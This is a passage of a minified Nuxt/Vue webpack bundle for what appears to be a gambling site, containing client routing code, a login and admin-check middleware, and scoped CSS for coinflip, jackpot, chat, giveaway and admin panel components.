                    t._hadError && t._dateLastError === t.$options.nuxt.dateErr && t.error()
                }

                function U(t, e) {
                    var r = this;
                    if (!1 !== this._routeChanged || !1 !== this._paramChanged || !1 !== this._queryChanged) {
                        var n = Object(d.h)(t),
                            c = Object(d.g)(t);
                        o.default.nextTick((function() {
                            n.forEach((function(t, i) {
                                if (t && !t._isDestroyed && t.constructor._dataRefresh && c[i] === t.constructor && !0 !== t.$vnode.data.keepAlive && "function" == typeof t.constructor.options.data) {
                                    var e = t.constructor.options.data.call(t);
                                    for (var r in e) o.default.set(t.$data, r, e[r]);
                                    window.$nuxt.$nextTick((function() {
                                        window.$nuxt.$emit("triggerScroll")
                                    }))
                                }
                            })), N(r)
                        }))
                    }
                }

                function D(t) {
                    window.onNuxtReadyCbs.forEach((function(e) {
                        "function" == typeof e && e(t)
                    })), "function" == typeof window._onNuxtLoaded && window._onNuxtLoaded(t), x.afterEach((function(e, r) {
                        o.default.nextTick((function() {
                            return t.$nuxt.$emit("routeChanged", e, r)
                        }))
                    }))
                }

                function L() {
                    return (L = Object(n.a)(regeneratorRuntime.mark((function t(e) {
                        var r, n, c, l;
                        return regeneratorRuntime.wrap((function(t) {
                            for (;;) switch (t.prev = t.next) {
                                case 0:
                                    return y = e.app, x = e.router, e.store, r = new o.default(y), n = function() {
                                        r.$mount("#__nuxt"), x.afterEach(P), x.afterEach(T.bind(r)), x.afterEach(U.bind(r)), o.default.nextTick((function() {
                                            D(r)
                                        }))
                                    }, t.next = 7, Promise.all(S(x));
                                case 7:
                                    if (c = t.sent, r.setTransitions = r.$options.nuxt.setTransitions.bind(r), c.length && (r.setTransitions(A(c, x.currentRoute)), w = x.currentRoute.matched.map((function(t) {
                                            return Object(d.c)(t.path)(x.currentRoute.params)
                                        }))), r.$loading = {}, k.error && r.error(k.error), x.beforeEach(j.bind(r)), x.beforeEach(I.bind(r)), !k.serverRendered || !Object(d.m)(k.routePath, r.context.route.path)) {
                                        t.next = 16;
                                        break
                                    }
                                    return t.abrupt("return", n());
                                case 16:
                                    return l = function() {
                                        P(x.currentRoute, x.currentRoute), T.call(r, x.currentRoute), N(r), n()
                                    }, t.next = 19, new Promise((function(t) {
                                        return setTimeout(t, 0)
                                    }));
                                case 19:
                                    I.call(r, x.currentRoute, x.currentRoute, (function(path) {
                                        if (path) {
                                            var t = x.afterEach((function(e, r) {
                                                t(), l()
                                            }));
                                            x.push(path, void 0, (function(t) {
                                                t && C(t)
                                            }))
                                        } else l()
                                    }));
                                case 20:
                                case "end":
                                    return t.stop()
                            }
                        }), t)
                    })))).apply(this, arguments)
                }
                Object(f.b)(null, k.config).then((function(t) {
                    return L.apply(this, arguments)
                })).catch(C)
            }.call(this, r(22))
    }, , , , , , , , , , , , , , function(t, e, r) {
        "use strict";
        r.r(e), e.default = function(t) {
            var e = t.store,
                r = t.redirect,
                n = t.error;
            if (!e.state.auth.loggedIn) return r("/login");
            e.state.auth.user._id > 0 && n("You are not authorized to view this page")
        }
    }, , , , , , , function(t, e, r) {
        "use strict";
        var n = r(102);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".coinflip[data-v-ce68ff7a],.coinflip__details[data-v-ce68ff7a]{display:grid;grid-row-gap:.5rem;row-gap:.5rem}.coinflip__details[data-v-ce68ff7a]{grid-template-columns:repeat(2,minmax(0,1fr));grid-column-gap:.5rem;-moz-column-gap:.5rem;column-gap:.5rem}.coinflip__details .detail[data-v-ce68ff7a]{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));padding:.5rem;border-radius:.25rem;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.coinflip__details .detail .detail__value[data-v-ce68ff7a]{font-size:1.25rem;--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.coinflip__details .detail.buttons[data-v-ce68ff7a]{display:grid;grid-row-gap:.25rem;row-gap:.25rem;grid-column-gap:.25rem;-moz-column-gap:.25rem;column-gap:.25rem;justify-content:space-evenly}@media (min-width:768px){.coinflip__details .detail.buttons[data-v-ce68ff7a]{grid-template-columns:repeat(2,minmax(0,1fr))}}.coinflip__details .detail .detail__button[data-v-ce68ff7a]{display:flex;height:100%;justify-content:center;align-items:center}@media (min-width:768px){.coinflip__details[data-v-ce68ff7a]{grid-template-columns:repeat(4,minmax(0,1fr))}}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(103);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".coinflip-list[data-v-0539b408]{display:grid;grid-row-gap:.25rem;row-gap:.25rem}.coinflip-list .coinflip-list__item[data-v-0539b408]{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity))}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(104);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".coinflip-list__item[data-v-4696e627]{border-radius:.25rem;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06);padding:.5rem;display:grid;grid-template-columns:repeat(2,minmax(0,1fr));align-items:center}@media (min-width:768px){.coinflip-list__item[data-v-4696e627]{grid-template-columns:repeat(3,minmax(0,1fr))}}.coinflip-list__item .item__players .players__avatar[data-v-4696e627]{border-width:0;transition-property:all;transition-duration:.2s;border-radius:9999px;display:inline;width:60px}.coinflip-list__item .item__players .players__option[data-v-4696e627]{border-radius:9999px;display:inline;width:60px}.coinflip-list__item .item__players.showWinner.challenger .players__avatar.challenger[data-v-4696e627],.coinflip-list__item .item__players.showWinner.creator .players__avatar.creator[data-v-4696e627]{border-width:4px;--border-opacity:1;border-color:#2196f3;border-color:rgba(33,150,243,var(--border-opacity))}.coinflip-list__item .item__user-assets[data-v-4696e627]{display:flex;align-items:center;justify-content:flex-end}.coinflip-list__item .item__user-assets .user-assets__image[data-v-4696e627]{width:60px}.coinflip-list__item .item__user-assets .user-assets__placeholder[data-v-4696e627]{--bg-opacity:1;background-color:#1a1c24;background-color:rgba(26,28,36,var(--bg-opacity));--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity));display:flex;justify-content:center;align-items:center;border-radius:9999px;height:50px;width:50px}@media (min-width:768px){.coinflip-list__item .item__user-assets[data-v-4696e627]{justify-content:flex-start}}.coinflip-list__item .item__controls[data-v-4696e627]{display:flex;grid-column:span 2/span 2}@media (min-width:768px){.coinflip-list__item .item__controls[data-v-4696e627]{grid-column:span 1/span 1}}.coinflip-list__item .item__controls .controls__value[data-v-4696e627]{display:grid;align-items:center}@media (min-width:768px){.coinflip-list__item .item__controls .controls__value[data-v-4696e627]{text-align:center}}.coinflip-list__item .item__controls .controls__value .value__primary[data-v-4696e627]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.coinflip-list__item .item__controls .controls__value .value__secondary[data-v-4696e627]{font-size:.875rem}.coinflip-list__item .item__controls .controls__status[data-v-4696e627]{display:flex;align-items:center;margin-left:auto;margin-right:auto}.coinflip-list__item .item__controls .controls__buttons[data-v-4696e627]{display:flex;flex-direction:column;align-items:center;justify-content:center}.coinflip-list__item .item__controls .controls__buttons .buttons__primary[data-v-4696e627]{margin-bottom:.25rem}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(105);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".knob-control__range{fill:none;transition:stroke .1s ease-in}.knob-control__value{fill:none}.knob-control__text-display{font-size:1.3rem;text-align:center}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(106);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".jackpot[data-v-0076445c]{display:grid;grid-row-gap:.5rem;row-gap:.5rem;justify-content:center;grid-template-columns:1fr}@media (min-width:768px){.jackpot[data-v-0076445c]{grid-template-columns:420px 1fr}}.jackpot .jackpot__wheel .wheel__chance-box[data-v-0076445c],.jackpot .jackpot__wheel .wheel__crypto-box[data-v-0076445c],.jackpot .jackpot__wheel .wheel__winner-box[data-v-0076445c]{display:grid;justify-content:center;text-align:center}.jackpot .jackpot__wheel .wheel__crypto-box[data-v-0076445c]{font-size:.875rem}.jackpot .jackpot__wheel .wheel__crypto-box .crypto-box__value .value__data[data-v-0076445c]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.jackpot .jackpot__wheel .wheel__chance-box .chance-box__chance[data-v-0076445c],.jackpot .jackpot__wheel .wheel__winner-box .winner-box__details[data-v-0076445c]{font-size:1.25rem}.jackpot .jackpot__data[data-v-0076445c]{display:grid;grid-column-gap:.5rem;-moz-column-gap:.5rem;column-gap:.5rem}@media (min-width:768px){.jackpot .jackpot__data[data-v-0076445c]{grid-template-columns:repeat(2,minmax(0,1fr))}}.jackpot .jackpot__data .data__history[data-v-0076445c],.jackpot .jackpot__data .data__players[data-v-0076445c]{text-align:center}.jackpot .jackpot__data .data__history .players__join[data-v-0076445c],.jackpot .jackpot__data .data__players .players__join[data-v-0076445c]{margin-top:.5rem;margin-bottom:.5rem}", ""]), t.exports = e
    }, , , , , function(t, e, r) {
        "use strict";
        var n = r(107);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".jackpot-players-list[data-v-3ecc639e]{display:grid;grid-row-gap:.25rem;row-gap:.25rem;overflow-y:auto;max-height:500px}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(108);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".jackpot-players-list__item[data-v-56eee3f0]{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));padding-top:.25rem;padding-bottom:.25rem;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06);border-radius:.25rem}.jackpot-players-list__item .item__header[data-v-56eee3f0]{text-align:center}.jackpot-players-list__item .item__header .header__username[data-v-56eee3f0]{display:inline-block;padding-left:.5rem;padding-right:.5rem;text-align:center;border-radius:9999px}.jackpot-players-list__item .item__header .header__value[data-v-56eee3f0]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.jackpot-players-list__item .item__user-asset[data-v-56eee3f0]{display:flex;justify-content:flex-start;align-items:center}.jackpot-players-list__item .item__user-asset .user-asset__data[data-v-56eee3f0]{text-align:left}.jackpot-players-list__item .item__user-asset .user-asset__data .data__image[data-v-56eee3f0]{display:flex;align-items:center;justify-content:center}.jackpot-players-list__item .item__user-asset .user-asset__data .data__value[data-v-56eee3f0]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(109);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".spinner[data-v-9239ce76]{display:flex;justify-content:center;align-items:center}.load[data-v-9239ce76]{display:inline-block;width:50px;height:50px;border-radius:50%;border:3px solid hsla(0,0%,100%,.3);border-top-color:#2196f3;animation:spin-data-v-9239ce76 1s ease-in-out infinite;-webkit-animation:spin-data-v-9239ce76 1s ease-in-out infinite}@keyframes spin-data-v-9239ce76{to{-webkit-transform:rotate(1turn)}}@-webkit-keyframes spin-data-v-9239ce76{to{-webkit-transform:rotate(1turn)}}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(110);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".jackpot-history-list[data-v-3c0a3a37]{display:grid;grid-row-gap:.25rem;row-gap:.25rem;grid-column-gap:.25rem;-moz-column-gap:.25rem;column-gap:.25rem;overflow-y:auto;max-height:500px}.jackpot-history-list .jackpot-history-list__item[data-v-3c0a3a37]{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));border-radius:.25rem;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(111);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".jackpot-history-list__item[data-v-3bde3069]{padding-top:.25rem;padding-bottom:.25rem;display:grid;justify-content:center;border-radius:.25rem;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.jackpot-history-list__item .item__player[data-v-3bde3069]{display:grid;justify-content:center;align-items:center}.jackpot-history-list__item .item__player .player__username[data-v-3bde3069]{margin-right:.5rem;--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));font-size:1.125rem}.jackpot-history-list__item .item__player .player__avatar[data-v-3bde3069]{display:flex;justify-content:center}.jackpot-history-list__item .item__player .player__avatar .avatar__img[data-v-3bde3069]{border-radius:9999px;border-width:4px}.jackpot-history-list__item .item__stat[data-v-3bde3069]{display:flex;margin-top:.5rem}.jackpot-history-list__item .item__stat.lg[data-v-3bde3069]{font-size:1.125rem}.jackpot-history-list__item .item__stat.md[data-v-3bde3069]{font-size:1rem}.jackpot-history-list__item .item__stat.sm[data-v-3bde3069]{font-size:.875rem}.jackpot-history-list__item .item__stat.primary[data-v-3bde3069]{--text-opacity:1;color:#febd01;color:rgba(254,189,1,var(--text-opacity))}.jackpot-history-list__item .item__stat.secondary[data-v-3bde3069]{--text-opacity:1;color:#2196f3;color:rgba(33,150,243,var(--text-opacity))}.jackpot-history-list__item .item__stat.default[data-v-3bde3069]{--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity))}.jackpot-history-list__item .item__stat .stat__value[data-v-3bde3069]{margin-left:auto}.jackpot-history-list__item .item__stat .asset-list[data-v-3bde3069]{display:flex;align-items:center}.jackpot-history-list__item .item__stat .asset-list .asset-list__placeholder[data-v-3bde3069]{--bg-opacity:1;background-color:#1a1c24;background-color:rgba(26,28,36,var(--bg-opacity));--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity));display:flex;justify-content:center;align-items:center;border-radius:9999px;height:25px;width:25px}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(112);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".announcement[data-v-168b21d2]{padding:.5rem;margin-bottom:.5rem;--bg-opacity:1;background-color:#f56565;background-color:rgba(245,101,101,var(--bg-opacity));--border-opacity:1;border-color:#f56565;border-color:rgba(245,101,101,var(--border-opacity));--bg-opacity:0.25;border-left-width:4px;border-radius:.25rem}.announcement .announcement__title[data-v-168b21d2]{font-size:1.25rem;--text-opacity:1;color:#f56565;color:rgba(245,101,101,var(--text-opacity))}.announcement .announcement__body[data-v-168b21d2]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));font-size:1.125rem}.main__pages[data-v-168b21d2]{margin:.5rem}.layout[data-v-168b21d2]{position:relative}.layout.modalShowing[data-v-168b21d2]{-webkit-filter:blur(16px);filter:blur(16px)}.background[data-v-168b21d2]{position:absolute;height:100%;width:100%;bottom:0;left:0;background-image:url(/img/background.svg);background-size:cover;background-position:100%;background-repeat:no-repeat;display:inline-block;opacity:.25}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(113);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".brand[data-v-71da751d]{display:flex;justify-content:center;align-items:center}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(114);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, "@media (min-width:768px){.user__controls[data-v-52c84507]{margin-left:auto;margin-right:.5rem}}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(115);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".chat__wrapper[data-v-c9687c5a],.spinner__wrapper[data-v-c9687c5a]{margin-top:.75rem;margin-bottom:.75rem;padding-left:.75rem;padding-right:.75rem}.chat__wrapper[data-v-c9687c5a]{display:flex;flex-direction:column;overflow-y:auto;max-height:calc(100vh - 225px)}@media (min-width:768px){.chat__wrapper[data-v-c9687c5a]{max-height:calc(100vh - 125px)}}.chat__wrapper .chat__channel[data-v-c9687c5a]{box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06);--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));border-radius:.25rem;padding:.5rem;margin-bottom:.5rem;font-size:.875rem}.chat__wrapper .chat__channel .online[data-v-c9687c5a]{float:right;display:inline-flex;align-items:center}.chat__wrapper .chat__channel .online .online__dot[data-v-c9687c5a]{margin-left:.25rem;height:.5rem;width:.5rem;--bg-opacity:1;background-color:#48bb78;background-color:rgba(72,187,120,var(--bg-opacity));border-radius:9999px}.chat__wrapper .chat__messages[data-v-c9687c5a]{position:relative;overflow-x:hidden;overflow-y:auto}.chat__wrapper .chat__form[data-v-c9687c5a]{display:grid;grid-row-gap:.5rem;row-gap:.5rem}.giveaway-submit[data-v-c9687c5a]{margin-bottom:.5rem}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(116);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".pills[data-v-f1a6f620]{display:flex}.pill[data-v-f1a6f620]{padding:.25rem;margin:.25rem;line-height:1.25;border-radius:9999px;font-size:.75rem;text-transform:uppercase;--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.pill.gray[data-v-f1a6f620]{--bg-opacity:1;background-color:#4a5568;background-color:rgba(74,85,104,var(--bg-opacity))}.pill.green[data-v-f1a6f620]{--bg-opacity:1;background-color:#48bb78;background-color:rgba(72,187,120,var(--bg-opacity))}.pill.blue[data-v-f1a6f620]{--bg-opacity:1;background-color:#2196f3;background-color:rgba(33,150,243,var(--bg-opacity))}.pill.gold[data-v-f1a6f620]{--bg-opacity:1;background-color:#febd01;background-color:rgba(254,189,1,var(--bg-opacity));--text-opacity:1;color:#000;color:rgba(0,0,0,var(--text-opacity))}.giveaway[data-v-f1a6f620]{margin-bottom:.5rem;--bg-opacity:1;background-color:#2b2c37;background-color:rgba(43,44,55,var(--bg-opacity));font-size:.875rem;border-radius:.25rem;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.giveaway .giveaway__section[data-v-f1a6f620]{text-align:center}.giveaway .giveaway__section .section__players[data-v-f1a6f620]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.giveaway .giveaway__details[data-v-f1a6f620]{display:flex;flex-direction:column;align-items:center}.giveaway .giveaway__details .details__image[data-v-f1a6f620]{width:auto;height:70px}.giveaway .giveaway__details .details__time[data-v-f1a6f620],.giveaway .giveaway__details .details__value[data-v-f1a6f620],.giveaway .giveaway__details .details__winner[data-v-f1a6f620]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.giveaway .giveaway__details .details__name[data-v-f1a6f620]{width:50%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(117);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".message[data-v-1626878e]{font-size:.875rem;margin-bottom:.5rem}.message .message__header[data-v-1626878e]{display:flex;align-items:center}.message .message__header .header__avatar[data-v-1626878e]{border-radius:9999px}.message .message__header .header__username[data-v-1626878e]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));margin-left:.25rem}.message .message__header .header__username.isVip[data-v-1626878e]{color:#f47fff}.message .message__header .header__username.isAdmin[data-v-1626878e]{color:#febd01}.message .message__body .body__content[data-v-1626878e]{word-wrap:break-word}.message .message__body .body__content.isAdmin[data-v-1626878e]{font-size:1.125rem}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(118);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".toggle[data-v-4a3d196d]{--bg-opacity:1;background-color:#1f2029;background-color:rgba(31,32,41,var(--bg-opacity));position:fixed;bottom:0;height:100px;width:100vw;display:none;z-index:20}.toggle .toggle__control[data-v-4a3d196d]{cursor:pointer;width:50%;align-items:center;justify-content:center;display:flex}@media (max-width:640px){.toggle[data-v-4a3d196d]{display:flex}}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(119);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".navbar[data-v-74eea8ea]{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));height:100px}.navbar[data-v-74eea8ea],.navbar .page-info[data-v-74eea8ea]{display:grid;align-items:center;justify-content:center}.navbar .page-info[data-v-74eea8ea]{grid-template-columns:repeat(2,minmax(0,1fr));text-align:center}.admin[data-v-74eea8ea]{margin:.5rem;display:grid;grid-column-gap:.5rem;-moz-column-gap:.5rem;column-gap:.5rem;grid-row-gap:.5rem;row-gap:.5rem;align-items:flex-start}@media (min-width:768px){.admin[data-v-74eea8ea]{grid-template-columns:repeat(4,minmax(0,1fr))}}.admin .widget[data-v-74eea8ea]{--bg-opacity:1;background-color:#1f2029;background-color:rgba(31,32,41,var(--bg-opacity));padding:.5rem;border-radius:.25rem;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06);overflow-y:auto;display:grid;grid-template-rows:25px 1fr;align-items:flex-start;min-height:400px;max-height:400px}.admin .widget .widget__title[data-v-74eea8ea]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));font-size:1.125rem;text-align:center}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(120);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".stat-list[data-v-7811cf9a]{display:grid}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(121);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".stat-list__item[data-v-be8bf7be]{display:flex}.stat-list__item .item__label[data-v-be8bf7be]{margin-right:.5rem}.stat-list__item .item__value[data-v-be8bf7be]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));margin-left:auto}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(122);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".admin__bots[data-v-fc8f5344]{display:grid;grid-row-gap:.5rem;row-gap:.5rem}.admin__bots .bots__form[data-v-fc8f5344]{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));padding:.5rem;display:grid;border-radius:.25rem;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.admin__bots .bots__list[data-v-fc8f5344]{display:grid;grid-row-gap:.25rem;row-gap:.25rem}.admin__bots .bots__list .list__item[data-v-fc8f5344]{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));padding:.5rem;display:grid;border-radius:.25rem;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.admin__bots .bots__list .list__item .item__header[data-v-fc8f5344]{display:flex;justify-content:center}.admin__bots .bots__list .list__item .item__header .header__controls[data-v-fc8f5344]{margin-left:.5rem}.admin__bots .bots__list .list__item .item__data[data-v-fc8f5344]{display:grid;grid-row-gap:.25rem;row-gap:.25rem}.admin__bots .bots__list .list__item .item__data .data[data-v-fc8f5344]{display:flex}.admin__bots .bots__list .list__item .item__data .data .data__label[data-v-fc8f5344]{--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity))}.admin__bots .bots__list .list__item .item__data .data .data__value[data-v-fc8f5344]{margin-left:auto;--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(123);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".form-input[data-v-1a6a289c]{height:2rem}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(124);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".form-select[data-v-7957dde0]{text-transform:uppercase;height:2rem}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(125);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".admin__users[data-v-13b8bd6f]{display:grid;grid-row-gap:.5rem;row-gap:.5rem}.admin__users .user[data-v-13b8bd6f],.admin__users .users__form[data-v-13b8bd6f]{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));padding:.5rem;display:grid;border-radius:.25rem;box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.admin__users .user .user__header[data-v-13b8bd6f]{display:flex;justify-content:center}.admin__users .user .user__header .header__title .title__id[data-v-13b8bd6f]{margin-left:.25rem;--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.admin__users .user .user__header .header__controls[data-v-13b8bd6f]{margin-left:.5rem}.admin__users .user .user__data[data-v-13b8bd6f]{display:grid;grid-row-gap:.25rem;row-gap:.25rem}.admin__users .user .user__data .data[data-v-13b8bd6f]{display:flex}.admin__users .user .user__data .data .data__label[data-v-13b8bd6f]{--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity))}.admin__users .user .user__data .data .data__value[data-v-13b8bd6f]{margin-left:auto;--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.admin__users .user .user__controls[data-v-13b8bd6f],.admin__users .user .user__controls .controls__moderation[data-v-13b8bd6f]{display:grid;grid-row-gap:.25rem;row-gap:.25rem}@media (min-width:768px){.admin__users .user .user__controls .controls__moderation[data-v-13b8bd6f]{grid-column-gap:.25rem;-moz-column-gap:.25rem;column-gap:.25rem;grid-template-columns:repeat(2,minmax(0,1fr))}}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(126);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".giveaway__form[data-v-24ed9bef]{display:grid}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(127);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".claims__list[data-v-57489aaa]{display:grid;grid-column-gap:.25rem;-moz-column-gap:.25rem;column-gap:.25rem;grid-row-gap:.25rem;row-gap:.25rem;overflow-y:auto}.claims__list .list__item[data-v-57489aaa]{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));border-radius:.25rem;padding:.25rem .5rem}.claims__list .list__item .item__data[data-v-57489aaa]{display:flex}.claims__list .list__item .item__data .data__label[data-v-57489aaa]{margin-right:.5rem}.claims__list .list__item .item__data .data__value[data-v-57489aaa]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));margin-left:auto}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(128);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".login[data-v-79e09df2]{display:grid;align-items:center;grid-row-gap:.5rem;row-gap:.5rem}.login .login__details .details__header[data-v-79e09df2]{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity));font-size:1.125rem}.login .login__form[data-v-79e09df2]{display:flex;flex-direction:column}.login .login__form .input__group[data-v-79e09df2]{--bg-opacity:1;background-color:#1a1c24;background-color:rgba(26,28,36,var(--bg-opacity));padding:.5rem;border-radius:9999px;display:grid;grid-column-gap:.5rem;-moz-column-gap:.5rem;column-gap:.5rem;grid-template-columns:1rem 1fr}.login .login__form .input__group .group__icon[data-v-79e09df2]{display:inline-block}.login .login__form .input__group .group__field[data-v-79e09df2]{background-color:transparent;outline:0}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(129);
        r.n(n).a
    }, function(t, e, r) {
        (e = r(3)(!1)).push([t.i, ".outer[data-v-c9d29e7c]{position:absolute;z-index:1050}.modal[data-v-c9d29e7c]{position:fixed}.modal[data-v-c9d29e7c],.modal .modal__background[data-v-c9d29e7c]{left:0;top:0;width:100%;height:100%}.modal .modal__background[data-v-c9d29e7c]{--bg-opacity:1;background-color:#000;background-color:rgba(0,0,0,var(--bg-opacity));--bg-opacity:0.5;position:absolute}.modal .modal__container[data-v-c9d29e7c]{margin:auto;height:100%;overflow-y:auto;max-width:800px}.modal .modal__container .container__body[data-v-c9d29e7c]{--bg-opacity:1;background-color:#24252f;background-color:rgba(36,37,47,var(--bg-opacity));margin:.5rem;position:relative;display:grid;border-radius:.25rem;grid-template-rows:25px 1fr}.modal .modal__container .container__body .body__close[data-v-c9d29e7c]{margin-left:.5rem;transition-property:background-color,border-color,color,fill,stroke;transition-duration:.5s}.modal .modal__container .container__body .body__close[data-v-c9d29e7c]:hover{--text-opacity:1;color:#f56565;color:rgba(245,101,101,var(--text-opacity))}.modal .modal__container .container__body .body__dialogue[data-v-c9d29e7c]{margin-left:.5rem;margin-right:.5rem;margin-bottom:.5rem}", ""]), t.exports = e
    }, function(t, e, r) {
        "use strict";
        var n = r(130);
        r.n(n).a
    }, function(t, e, r) {
